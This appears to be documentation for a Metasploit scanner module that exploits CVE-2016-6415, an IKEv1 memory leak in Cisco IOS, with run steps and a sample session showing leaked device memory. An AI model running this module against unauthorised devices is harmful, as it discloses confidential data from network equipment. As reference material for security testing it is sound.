This module is for CVE-2016-6415, A vulnerability in Internet Key Exchange version 1 (IKEv1) packet processing code in Cisco IOS, Cisco IOS XE, and Cisco IOS XR Software could allow an unauthenticated, remote attacker to retrieve memory contents, which could lead to the disclosure of confidential information.

The vulnerability is due to insufficient condition checks in the part of the code that handles IKEv1 security negotiation requests. An attacker could exploit this vulnerability by sending a crafted IKEv1 packet to an affected device configured to accept IKEv1 security negotiation requests. A successful exploit could allow the attacker to retrieve memory contents, which could lead to the disclosure of confidential information.

## Verification Steps

1. Do: ```use auxiliary/scanner/ike/cisco_ike_benigncertain```
2. Do: ```set RHOSTS [IP]```
3. Do: ```set RPORT [PORT]```
4. Do: ```run```

## Scenarios

```
msf auxiliary(cisco_ike_benigncertain) > show options

Module options (auxiliary/scanner/ike/cisco_ike_benigncertain):

   Name        Current Setting                                                                            Required  Description
   ----        ---------------                                                                            --------  -----------
   PACKETFILE  /opt/metasploit-framework/data/exploits/cve-2016-6415/sendpacket.raw                       yes       The ISAKMP packet file
   RHOSTS      192.168.1.2                                                                                yes       The target address range or CIDR identifier
   RPORT       500                                                                                        yes       The target port
   THREADS     1                                                                                          yes       The number of concurrent threads

msf auxiliary(cisco_ike_benigncertain) > set verbose True
msf auxiliary(cisco_ike_benigncertain) > run

[*] Printable info leaked:
>5..).........9.................................................................x...D.#..............+#.........\.....?.L...l...........h.............#.....................l...\...........l.....X.................a.#...R....X.....y#.........x...@V$.\.............X.<....X................W....._y>..#t... .....H...X.....W.......................................>.$...........>5..).............................!.....:3.K......X.............xV4.xV4.xV4.......................................X...........X.:3.KxV4.xV4.................$...m;......xV4.xV4.xV4.xV4.xV4.xV4.xV4.xV4...........!.....<<<<........................................................................................................................................................<<<<....................$...............................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................<<<<1.......................................<<<<....9....... .......d....................Q..........<<<<....9....... ...............(............Q..........<<<<........................CI................................................................................ab_cdefg_pool...................................................................................................................................................................................ozhu7vp...........................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................
[+] 192.168.1.2:500 - IKE response with leak
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
